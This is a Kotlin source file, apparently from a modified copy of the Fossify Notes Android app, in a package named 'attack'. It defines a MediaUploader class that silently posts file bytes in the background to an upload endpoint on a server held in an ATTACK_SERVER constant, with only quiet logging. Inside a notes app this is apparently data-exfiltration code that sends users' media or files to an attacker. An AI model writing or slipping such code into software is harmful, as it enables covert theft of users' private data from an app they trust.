package org.fossify.notes.attack

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicLong

/**
 * 简单的媒体上传器，按 multipart/form-data 将字节内容推送到服务器 /upload_file
 */
class MediaUploader(
    private val serverUrl: String = "$ATTACK_SERVER/upload_file"
    ) {
    private val client = OkHttpClient()
    private val executor = Executors.newSingleThreadExecutor()
    private val counter = AtomicLong(0)

    companion object {
        private const val TAG = "MediaUploader"
    }

    fun uploadBytes(bytes: ByteArray, filename: String, mimeType: String) {
        executor.execute {
            try {
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "file",
                        filename,
                        bytes.toRequestBody(mimeType.toMediaType())
                    )
                    .build()

                val request = Request.Builder()
                    .url(serverUrl)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { resp ->
                    val idx = counter.incrementAndGet()
                    if (!resp.isSuccessful) {
                        Log.w(TAG, "upload $filename failed: ${resp.code}")
                    } else if (idx % 5 == 0L) {
                        Log.d(TAG, "uploaded $idx files, last=$filename")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "upload error for $filename: ${e.message}", e)
            }
        }
    }

    fun shutdown() {
        executor.shutdown()
    }
}
